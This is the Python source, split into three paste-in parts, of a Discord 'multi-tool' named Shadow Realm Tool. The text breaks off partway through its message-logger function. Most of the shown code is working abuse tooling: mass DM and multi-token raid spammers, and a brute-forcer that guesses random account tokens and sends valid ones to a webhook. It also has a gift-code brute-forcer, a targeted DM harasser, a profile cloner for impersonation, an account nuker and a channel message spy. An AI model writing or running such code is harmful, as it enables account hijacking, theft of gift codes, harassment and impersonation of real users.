
"""
═══════════════════════════════════════════════════════════════════════════════

═══════════════════════════════════════════════════════════════════════════════

INSTALLATION:
pip install requests colorama pyaudio wave

Save as: discord_shadow_realm.py
Run: python discord_shadow_realm.py

═══════════════════════════════════════════════════════════════════════════════
PART 1 OF 3 - START COPYING
═══════════════════════════════════════════════════════════════════════════════
"""

import os, time, requests, random, string, threading, json
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

CYAN = Fore.CYAN
BLUE = Fore.BLUE
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""{CYAN}
{WHITE}═══════════════════════════════════════════════════════════════════════════
     {MAGENTA}{WHITE} | Discord Multi-Tool
    ═══════════════════════════════════════════════════════════════════════════
{RESET}""")

def menu():
    banner()
    print(f"""
{CYAN}╔═══════════════════════════╗  ╔═══════════════════════════╗  ╔═══════════════════════════╗
║ {BLUE}(01){CYAN} > Mass DM           {CYAN}║  ║ {BLUE}(07){CYAN} > DM Spammer         {CYAN}║  ║ {BLUE}(13){CYAN} > Giveaway Sniper    {CYAN}║
║ {BLUE}(02){CYAN} > Server Raid       {CYAN}║  ║ {BLUE}(08){CYAN} > Profile Cloner     {CYAN}║  ║ {BLUE}(14){CYAN} > Message Logger     {CYAN}║
║ {BLUE}(03){CYAN} > Token Generator   {CYAN}║  ║ {BLUE}(09){CYAN} > Reaction Nuker     {CYAN}║  ║ {BLUE}(15){CYAN} > Invite Tracker     {CYAN}║
║ {BLUE}(04){CYAN} > Nitro Generator   {CYAN}║  ║ {BLUE}(10){CYAN} > Server Analytics   {CYAN}║  ║ {BLUE}(16){CYAN} > Message Backup     {CYAN}║
║ {BLUE}(05){CYAN} > Status Rotator    {CYAN}║  ║ {BLUE}(11){CYAN} > Account Nuker      {CYAN}║  ║ {BLUE}(17){CYAN} > VC Recorder        {CYAN}║
║ {BLUE}(06){CYAN} > Auto Responder    {CYAN}║  ║ {BLUE}(12){CYAN} > Game Activity      {CYAN}║  ║ {BLUE}(18){CYAN} > Exit               {CYAN}║
╚═══════════════════════════╝  ╚═══════════════════════════╝  ╚═══════════════════════════╝
{RESET}""")

def log(msg, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if level == "success":
        print(f"{GREEN}[{timestamp}] [+] {msg}{RESET}")
    elif level == "error":
        print(f"{RED}[{timestamp}] [!] {msg}{RESET}")
    elif level == "warning":
        print(f"{YELLOW}[{timestamp}] [*] {msg}{RESET}")
    else:
        print(f"{CYAN}[{timestamp}] [>] {msg}{RESET}")

def validate_token(token):
    try:
        r = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, timeout=5)
        return r.status_code == 200
    except:
        return False

def send_webhook(url, embed):
    try:
        payload = {"username": "Shadow Realm Tool | @DarkKnight", "avatar_url": "https://i.imgur.com/AfFp7pu.png", "embeds": [embed]}
        r = requests.post(url, json=payload)
        return r.status_code in [200, 204]
    except:
        return False

# Tool 1: Mass DM
def mass_dm():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(01) MASS DM")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    message = input(f"{CYAN}[>]{WHITE} Enter Message: {RESET}").strip()
    try:
        reps = int(input(f"{CYAN}[>]{WHITE} Enter Repetitions: {RESET}").strip())
    except:
        log("Invalid number!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated successfully", "success")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
    
    if not isinstance(channels, list):
        log("Failed to fetch DM channels", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log(f"Found {len(channels)} DM channels", "info")
    for rep in range(reps):
        log(f"Repetition {rep+1}/{reps}", "warning")
        for ch in channels:
            try:
                r = requests.post(f"https://discord.com/api/v9/channels/{ch['id']}/messages", headers=headers, json={"content": message})
                if r.status_code in [200, 201]:
                    log(f"Sent to channel {ch['id']}", "success")
                else:
                    log(f"Error {r.status_code} on {ch['id']}", "error")
                time.sleep(0.5)
            except Exception as e:
                log(str(e), "error")
    log("MASS DM COMPLETED!", "success")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 2: Server Raid
def server_raid():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(02) SERVER RAID")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    tokens_input = input(f"{CYAN}[>]{WHITE} Enter Tokens (comma-separated): {RESET}").strip()
    tokens = [t.strip() for t in tokens_input.split(",") if t.strip()]
    chans_input = input(f"{CYAN}[>]{WHITE} Enter Channel IDs (comma-separated): {RESET}").strip()
    channels = [c.strip() for c in chans_input.split(",") if c.strip()]
    message = input(f"{CYAN}[>]{WHITE} Enter Message: {RESET}").strip()
    try:
        threads_num = int(input(f"{CYAN}[>]{WHITE} Enter Threads (recommended 2-5): {RESET}").strip())
        cycles = int(input(f"{CYAN}[>]{WHITE} Enter Cycles (how many rounds): {RESET}").strip())
    except:
        log("Invalid numbers!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    if not tokens or not channels or not message:
        log("Please fill all fields!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log(f"Starting raid with {len(tokens)} tokens, {len(channels)} channels", "info")
    
    def raid_once():
        try:
            token = random.choice(tokens)
            ch = random.choice(channels)
            r = requests.post(f"https://discord.com/api/v9/channels/{ch}/messages", json={'content': message}, headers={'Authorization': token, 'Content-Type': 'application/json'})
            if r.status_code in [200, 204]:
                log(f"Hit channel {ch}", "success")
            else:
                log(f"Failed {r.status_code}", "error")
        except Exception as e:
            log(str(e), "error")
    
    for cycle in range(cycles):
        log(f"Cycle {cycle+1}/{cycles}", "warning")
        threads = []
        for _ in range(threads_num):
            t = threading.Thread(target=raid_once)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        time.sleep(0.3)
    log("RAID COMPLETED!", "success")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 3: Token Generator
def token_gen():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(03) TOKEN GENERATOR")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    webhook = input(f"{CYAN}[>]{WHITE} Enter Webhook URL (optional, press ENTER to skip): {RESET}").strip() or None
    try:
        threads_num = int(input(f"{CYAN}[>]{WHITE} Enter Threads (recommended 10): {RESET}").strip())
        attempts = int(input(f"{CYAN}[>]{WHITE} Enter Max Attempts (0 for infinite): {RESET}").strip())
    except:
        log("Invalid numbers!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    if webhook:
        log("Webhook enabled - valid tokens will be sent!", "success")
    log("Starting token generation... (Press CTRL+C to stop)", "info")
    
    count = 0
    found = 0
    
    def check_token():
        nonlocal count, found
        first = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([24, 26])))
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6))
        third = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38))
        token = f"{first}.{second}.{third}"
        count += 1
        try:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}, timeout=2).json()
            if 'username' in user:
                found += 1
                log(f"VALID TOKEN: {token}", "success")
                if webhook:
                    embed = {"title": "🎯 VALID TOKEN", "description": f"```{token}```", "color": 65280, "fields": [{"name": "User", "value": user.get('username', 'N/A'), "inline": True}, {"name": "ID", "value": user.get('id', 'N/A'), "inline": True}], "footer": {"text": "Shadow Realm Tool | @DarkKnight"}, "timestamp": datetime.utcnow().isoformat()}
                    send_webhook(webhook, embed)
        except:
            pass
    
    try:
        while attempts == 0 or count < attempts:
            threads = []
            for _ in range(threads_num):
                t = threading.Thread(target=check_token)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            if count % 100 == 0:
                log(f"Checked: {count} | Found: {found}", "info")
    except KeyboardInterrupt:
        log("Stopped by user", "warning")
    log(f"COMPLETE - Checked: {count} | Found: {found}", "success")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 4: Nitro Generator
def nitro_gen():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(04) NITRO GENERATOR")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    webhook = input(f"{CYAN}[>]{WHITE} Enter Webhook URL (optional, press ENTER to skip): {RESET}").strip() or None
    try:
        threads_num = int(input(f"{CYAN}[>]{WHITE} Enter Threads (recommended 10): {RESET}").strip())
        attempts = int(input(f"{CYAN}[>]{WHITE} Enter Max Attempts (0 for infinite): {RESET}").strip())
    except:
        log("Invalid numbers!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    if webhook:
        log("Webhook enabled - valid codes will be sent!", "success")
    log("Starting nitro generation... (Press CTRL+C to stop)", "info")
    
    count = 0
    found = 0
    
    def check_nitro():
        nonlocal count, found
        code = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
        url = f'https://discord.gift/{code}'
        count += 1
        try:
            r = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true', timeout=1)
            if r.status_code == 200:
                found += 1
                log(f"VALID NITRO: {url}", "success")
                if webhook:
                    embed = {"title": "💎 VALID NITRO", "description": f"```{url}```", "color": 16711935, "fields": [{"name": "Link", "value": f"[Redeem]({url})", "inline": False}], "footer": {"text": "Shadow Realm Tool | @DarkKnight"}, "timestamp": datetime.utcnow().isoformat()}
                    send_webhook(webhook, embed)
        except:
            pass
    
    try:
        while attempts == 0 or count < attempts:
            threads = []
            for _ in range(threads_num):
                t = threading.Thread(target=check_nitro)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            if count % 100 == 0:
                log(f"Checked: {count} | Found: {found}", "info")
    except KeyboardInterrupt:
        log("Stopped by user", "warning")
    log(f"COMPLETE - Checked: {count} | Found: {found}", "success")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 5: Status Rotator
def status_rotator():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(05) STATUS ROTATOR")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    statuses_input = input(f"{CYAN}[>]{WHITE} Enter Statuses (comma-separated): {RESET}").strip()
    statuses = [s.strip() for s in statuses_input.split(",") if s.strip()]
    try:
        delay = int(input(f"{CYAN}[>]{WHITE} Enter Delay Between Rotations (seconds): {RESET}").strip())
    except:
        log("Invalid number!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated - Starting status rotation (Press CTRL+C to stop)", "success")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        while True:
            for status in statuses:
                payload = {"custom_status": {"text": status}}
                r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
                if r.status_code == 200:
                    log(f"Status changed to: {status}", "success")
                else:
                    log(f"Failed to change status: {r.status_code}", "error")
                time.sleep(delay)
    except KeyboardInterrupt:
        log("Status rotation stopped", "warning")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 6: Auto Responder
def auto_responder():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(06) AUTO RESPONDER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    trigger = input(f"{CYAN}[>]{WHITE} Enter Trigger Word/Phrase: {RESET}").strip().lower()
    response = input(f"{CYAN}[>]{WHITE} Enter Auto Response: {RESET}").strip()
    typing = input(f"{CYAN}[>]{WHITE} Simulate Typing? (y/n): {RESET}").strip().lower() == 'y'
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated - Auto responder active (Press CTRL+C to stop)", "success")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    last_msg_id = None
    
    try:
        while True:
            try:
                channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
                for ch in channels:
                    if not isinstance(ch, dict):
                        continue
                    msgs = requests.get(f"https://discord.com/api/v9/channels/{ch['id']}/messages?limit=1", headers=headers).json()
                    if msgs and isinstance(msgs, list) and len(msgs) > 0:
                        msg = msgs[0]
                        if msg['id'] != last_msg_id and trigger in msg.get('content', '').lower():
                            last_msg_id = msg['id']
                            if typing:
                                requests.post(f"https://discord.com/api/v9/channels/{ch['id']}/typing", headers=headers)
                                time.sleep(2)
                            r = requests.post(f"https://discord.com/api/v9/channels/{ch['id']}/messages", headers=headers, json={"content": response})
                            if r.status_code in [200, 201]:
                                log(f"Responded in channel {ch['id']}", "success")
                time.sleep(2)
            except:
                pass
    except KeyboardInterrupt:
        log("Auto responder stopped", "warning")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

"""
═══════════════════════════════════════════════════════════════════════════════
PART 2 OF 3 - PASTE AFTER PART 1
═══════════════════════════════════════════════════════════════════════════════
"""

# Tool 7: DM Spammer
def dm_spammer():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(07) DM SPAMMER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    user_id = input(f"{CYAN}[>]{WHITE} Enter Target User ID: {RESET}").strip()
    message = input(f"{CYAN}[>]{WHITE} Enter Message: {RESET}").strip()
    try:
        count = int(input(f"{CYAN}[>]{WHITE} Enter Count: {RESET}").strip())
        delay = float(input(f"{CYAN}[>]{WHITE} Enter Delay (seconds): {RESET}").strip())
    except:
        log("Invalid numbers!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated", "success")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={'recipient_id': user_id})
    
    if r.status_code != 200:
        log("Failed to create DM channel!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    ch_id = r.json()['id']
    log(f"DM channel created: {ch_id}", "success")
    
    sent = 0
    for i in range(count):
        try:
            r = requests.post(f"https://discord.com/api/v9/channels/{ch_id}/messages", headers=headers, json={"content": message})
            sent += 1
            if r.status_code in [200, 201]:
                log(f"Message {sent}/{count} sent", "success")
            else:
                log(f"Error {r.status_code}", "error")
            time.sleep(delay)
        except Exception as e:
            log(str(e), "error")
    log(f"Done! Sent {sent} messages", "success")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 8: Profile Cloner
def profile_cloner():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(08) PROFILE CLONER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    your_token = input(f"{CYAN}[>]{WHITE} Enter Your Discord Token: {RESET}").strip()
    target_id = input(f"{CYAN}[>]{WHITE} Enter Target User ID to Clone: {RESET}").strip()
    
    if not validate_token(your_token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated - Fetching target profile...", "success")
    headers = {'Authorization': your_token, 'Content-Type': 'application/json'}
    
    try:
        target = requests.get(f'https://discord.com/api/v9/users/{target_id}', headers=headers).json()
        if 'username' not in target:
            log("Could not fetch target user!", "error")
            input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
            return
        
        log(f"Cloning profile of: {target['username']}", "info")
        
        if 'global_name' in target and target['global_name']:
            payload = {'global_name': target['global_name']}
            r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=payload)
            if r.status_code == 200:
                log(f"Display name changed to: {target['global_name']}", "success")
        
        if target.get('avatar'):
            avatar_url = f"https://cdn.discordapp.com/avatars/{target_id}/{target['avatar']}.png?size=1024"
            avatar_data = requests.get(avatar_url).content
            import base64
            avatar_b64 = base64.b64encode(avatar_data).decode('utf-8')
            payload = {'avatar': f"data:image/png;base64,{avatar_b64}"}
            r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=payload)
            if r.status_code == 200:
                log("Avatar cloned successfully", "success")
        
        if target.get('banner'):
            banner_url = f"https://cdn.discordapp.com/banners/{target_id}/{target['banner']}.png?size=1024"
            banner_data = requests.get(banner_url).content
            import base64
            banner_b64 = base64.b64encode(banner_data).decode('utf-8')
            payload = {'banner': f"data:image/png;base64,{banner_b64}"}
            r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=payload)
            if r.status_code == 200:
                log("Banner cloned successfully", "success")
        
        log("Profile cloning complete!", "success")
        
    except Exception as e:
        log(f"Error during cloning: {str(e)}", "error")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 9: Reaction Nuker
def reaction_nuker():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(09) REACTION NUKER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    print(f"{CYAN}[1]{WHITE} Remove all reactions from messages")
    print(f"{CYAN}[2]{WHITE} Add mass reactions to a message\n")
    choice = input(f"{CYAN}[>]{WHITE} Select mode: {RESET}").strip()
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    channel_id = input(f"{CYAN}[>]{WHITE} Enter Channel ID: {RESET}").strip()
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    if choice == "1":
        try:
            limit = int(input(f"{CYAN}[>]{WHITE} How many messages to check? {RESET}").strip())
        except:
            limit = 50
        
        log("Fetching messages...", "info")
        msgs = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit={limit}", headers=headers).json()
        
        if not isinstance(msgs, list):
            log("Failed to fetch messages", "error")
            input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
            return
        
        log(f"Found {len(msgs)} messages - Removing reactions...", "info")
        for msg in msgs:
            if 'reactions' in msg and msg['reactions']:
                try:
                    r = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}/messages/{msg['id']}/reactions", headers=headers)
                    if r.status_code == 204:
                        log(f"Cleared reactions from message {msg['id']}", "success")
                    time.sleep(0.5)
                except Exception as e:
                    log(str(e), "error")
        log("Reaction nuking complete!", "success")
    
    elif choice == "2":
        message_id = input(f"{CYAN}[>]{WHITE} Enter Message ID: {RESET}").strip()
        emojis_input = input(f"{CYAN}[>]{WHITE} Enter Emojis (comma-separated, e.g., 👍,❤️,😂): {RESET}").strip()
        emojis = [e.strip() for e in emojis_input.split(",") if e.strip()]
        
        log("Adding reactions...", "info")
        for emoji in emojis:
            try:
                import urllib.parse
                emoji_encoded = urllib.parse.quote(emoji)
                r = requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji_encoded}/@me", headers=headers)
                if r.status_code == 204:
                    log(f"Added reaction {emoji}", "success")
                else:
                    log(f"Failed to add {emoji}: {r.status_code}", "error")
                time.sleep(0.3)
            except Exception as e:
                log(str(e), "error")
        log("Mass reaction complete!", "success")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 10: Server Analytics
def server_analytics():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(10) SERVER ANALYTICS")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    guild_id = input(f"{CYAN}[>]{WHITE} Enter Server ID: {RESET}").strip()
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Fetching server data...", "info")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        guild = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers).json()
        if 'name' not in guild:
            log("Could not fetch server info!", "error")
            input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
            return
        
        print(f"\n{CYAN}═══════════════════════════════════════════════════════════════════════════")
        print(f"{BLUE}SERVER: {WHITE}{guild['name']}")
        print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        members = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers).json()
        if isinstance(members, list):
            log(f"Total Members: {len(members)}", "info")
            bots = sum(1 for m in members if m.get('user', {}).get('bot', False))
            log(f"Bots: {bots} | Humans: {len(members) - bots}", "info")
        
        channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers).json()
        if isinstance(channels, list):
            text_channels = sum(1 for c in channels if c.get('type') == 0)
            voice_channels = sum(1 for c in channels if c.get('type') == 2)
            log(f"Text Channels: {text_channels} | Voice Channels: {voice_channels}", "info")
        
        roles = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers).json()
        if isinstance(roles, list):
            log(f"Total Roles: {len(roles)}", "info")
        
        emojis = guild.get('emojis', [])
        log(f"Custom Emojis: {len(emojis)}", "info")
        
        if 'premium_tier' in guild:
            log(f"Boost Level: {guild['premium_tier']}", "info")
        if 'premium_subscription_count' in guild:
            log(f"Boosts: {guild['premium_subscription_count']}", "info")
        
        guild_created = int(guild_id) >> 22
        created_date = datetime.fromtimestamp(guild_created / 1000 + 1420070400)
        log(f"Created: {created_date.strftime('%Y-%m-%d')}", "info")
        
        log("Analytics complete!", "success")
        
    except Exception as e:
        log(f"Error fetching analytics: {str(e)}", "error")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Tool 11: Account Nuker
def account_nuker():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(11) ACCOUNT NUKER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    print(f"{RED}⚠️  WARNING: This will DESTROY the account!{RESET}")
    print(f"{RED}    - Leave all servers{RESET}")
    print(f"{RED}    - Remove all friends{RESET}")
    print(f"{RED}    - Close all DMs{RESET}\n")
    
    confirm = input(f"{YELLOW}Type 'NUKE' to confirm: {RESET}").strip()
    if confirm != "NUKE":
        log("Cancelled", "warning")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token to NUKE: {RESET}").strip()
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated - STARTING ACCOUNT NUKE", "warning")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        log("Leaving all servers...", "info")
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers).json()
        if isinstance(guilds, list):
            for guild in guilds:
                try:
                    r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=headers)
                    if r.status_code == 204:
                        log(f"Left server: {guild['name']}", "success")
                    time.sleep(0.5)
                except:
                    pass
        
        log("Removing all friends...", "info")
        friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers).json()
        if isinstance(friends, list):
            for friend in friends:
                try:
                    r = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
                    if r.status_code == 204:
                        log(f"Removed friend: {friend['user']['username']}", "success")
                    time.sleep(0.5)
                except:
                    pass
        
        log("Closing all DM channels...", "info")
        dms = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers).json()
        if isinstance(dms, list):
            for dm in dms:
                try:
                    r = requests.delete(f"https://discord.com/api/v9/channels/{dm['id']}", headers=headers)
                    if r.status_code == 200:
                        log(f"Closed DM: {dm['id']}", "success")
                    time.sleep(0.3)
                except:
                    pass
        
        log("ACCOUNT NUKED SUCCESSFULLY!", "success")
        
    except Exception as e:
        log(f"Error during nuke: {str(e)}", "error")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# NEW FEATURE 1: Game Activity Changer
def game_activity():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(12) GAME ACTIVITY CHANGER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    game_name = input(f"{CYAN}[>]{WHITE} Enter Game Name: {RESET}").strip()
    activity_type = input(f"{CYAN}[>]{WHITE} Activity Type (0=Playing, 1=Streaming, 2=Listening, 3=Watching): {RESET}").strip()
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    try:
        act_type = int(activity_type)
    except:
        act_type = 0
    
    log("Setting game activity...", "info")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    payload = {
        "activities": [{
            "name": game_name,
            "type": act_type
        }]
    }
    
    r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
    if r.status_code == 200:
        log(f"Game activity set to: {game_name}", "success")
    else:
        log(f"Failed to set activity: {r.status_code}", "error")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

"""
═══════════════════════════════════════════════════════════════════════════════
PART 3 OF 3 - PASTE AFTER PART 2
═══════════════════════════════════════════════════════════════════════════════
"""

# NEW FEATURE 2: Giveaway Sniper
def giveaway_sniper():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(13) GIVEAWAY SNIPER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    guild_id = input(f"{CYAN}[>]{WHITE} Enter Server ID to Monitor: {RESET}").strip()
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Token validated - Monitoring for giveaways (Press CTRL+C to stop)", "success")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    seen_messages = set()
    
    try:
        while True:
            try:
                channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers).json()
                if isinstance(channels, list):
                    for ch in channels:
                        if ch.get('type') == 0:
                            msgs = requests.get(f"https://discord.com/api/v9/channels/{ch['id']}/messages?limit=5", headers=headers).json()
                            if isinstance(msgs, list):
                                for msg in msgs:
                                    if msg['id'] not in seen_messages:
                                        seen_messages.add(msg['id'])
                                        content_lower = msg.get('content', '').lower()
                                        if 'giveaway' in content_lower or '🎉' in msg.get('content', ''):
                                            import urllib.parse
                                            emoji = urllib.parse.quote('🎉')
                                            r = requests.put(f"https://discord.com/api/v9/channels/{ch['id']}/messages/{msg['id']}/reactions/{emoji}/@me", headers=headers)
                                            if r.status_code == 204:
                                                log(f"Entered giveaway in channel {ch['id']}", "success")
                time.sleep(3)
            except:
                pass
    except KeyboardInterrupt:
        log("Giveaway sniper stopped", "warning")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# NEW FEATURE 3: Message Logger
def message_logger():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(14) MESSAGE LOGGER / SPY")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    channel_id = input(f"{CYAN}[>]{WHITE} Enter Channel ID to Log: {RESET}").strip()
    filename = input(f"{CYAN}[>]{WHITE} Enter Output Filename (e.g., log.txt): {RESET}").strip() or "message_log.txt"
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log(f"Token validated - Logging messages to {filename} (Press CTRL+C to stop)", "success")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    seen_messages = set()
    
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"\n\n=== Message Log Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
            
            while True:
                try:
                    msgs = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=10", headers=headers).json()
                    if isinstance(msgs, list):
                        for msg in msgs:
                            if msg['id'] not in seen_messages:
                                seen_messages.add(msg['id'])
